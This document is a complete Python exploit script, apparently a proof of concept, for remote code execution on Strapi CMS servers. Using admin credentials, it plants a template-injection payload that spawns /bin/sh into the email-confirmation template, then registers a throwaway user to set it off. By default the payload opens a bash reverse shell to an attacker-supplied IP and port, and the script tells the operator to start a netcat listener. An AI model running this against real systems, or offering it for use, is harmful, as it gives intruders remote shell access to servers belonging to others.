#!/usr/bin/env python3
import requests
import random, string, argparse


def get_token(username, password) -> str:
    r = requests.post(
        url + "/admin/login", data={"email": username, "password": password}
    )
    try:
        return r.json()["data"]["token"]
        print("[+] Using token: " + token)
    except:
        print("[!] Error while getting token\nDEBUG: " + r.text)
        exit(1)


def enable_confirmation(token, url_redirect):
    r = requests.put(
        url + "/users-permissions/advanced",
        headers={"Authorization": "Bearer " + token},
        json={
            "unique_email": "true",
            "allow_register": "true",
            "email_confirmation": "true",
            "email_reset_password": "null",
            "email_confirmation_redirection": url_redirect,
            "default_role": "authenticated",
        },
    )
    if "ok" in r.text:
        print("[+] Email confirmation enabled")
    else:
        print("[-] Error while enabling email confirmation\nDEBUG: " + r.text)
        exit(1)


def add_payload(ip, port, payload=None):
    if payload is None:
        print(
            f"[INFO] No custom payload provided, using bash -i >& /dev/tcp/{ip}/{port} 0>&1 open a netcat listener: rlwrap nc -lvnp {port}"
        )
        input("Done ? (y/n): ")
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    full_payload = (
        r'''<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","'''
        + payload
        + r""""],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>"""
    )
    data = {
        "email-templates": {
            "email_confirmation": {
                "display": "Email.template.email_confirmation",
                "icon": "check-square",
                "options": {
                    "from": {
                        "name": "Administration Panel",
                        "email": "no-reply@strapi.io",
                    },
                    "response_email": "",
                    "object": "Account confirmation",
                    "message": f"<p>Thank you for registering!</p>\n\n{full_payload}",
                },
            }
        }
    }
    r = requests.put(
        url + "/users-permissions/email-templates",
        json=data,
        headers={"Authorization": "Bearer " + token},
    )
    if "ok" in r.text:
        print("[+] Malicious template added to email confirmation page")
    else:
        print("[-] Error while adding malicious template\nDEBUG: " + r.text)
        exit(1)


def trigger_rce():
    json_data = {
        "email": "".join(random.choices(string.ascii_lowercase, k=10)) + "@poc.local",
        "username": "".join(random.choices(string.ascii_lowercase, k=10)),
        "password": "".join(random.choices(string.ascii_lowercase, k=10)) + "?#A",
    }
    r = requests.post(url + "/api/auth/local/register", json=json_data)
    print(
        "[+] sendTemplatedEmail() should be triggered, check your listener\nDEBUG: "
        + r.text
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-url", help="URL of the Strapi instance", required=True)
    parser.add_argument("-u", help="Admin username", required=True)
    parser.add_argument("-p", help="Admin password", required=True)
    parser.add_argument("-ip", help="Attacker IP")
    parser.add_argument("-port", help="Attacker port")
    parser.add_argument(
        "-url_redirect", help="URL to redirect after email confirmation"
    )
    parser.add_argument("-custom", help="Custom shell command to execute")
    args = parser.parse_args()
    url = args.url
    if url[-1] == "/":
        url = url[:-1]
    token = get_token(args.u, args.p)
    if args.url_redirect:
        enable_confirmation(token, args.url_redirect)
    else:
        print(
            "[i] No URL redirect provided, email confirmation will may encounter an error, using http://poc.com"
        )
        enable_confirmation(token, "http://poc.com")
    if args.custom:
        add_payload(args.ip, args.port, args.custom)
    elif args.ip and args.port:
        add_payload(args.ip, args.port)
    else:
        print(
            "[-] No ip and port provided, please provide them with -ip and -port or use -custom to provide a custom payload"
        )
        exit(1)
    print("[+] Waiting for RCE...")
    trigger_rce()
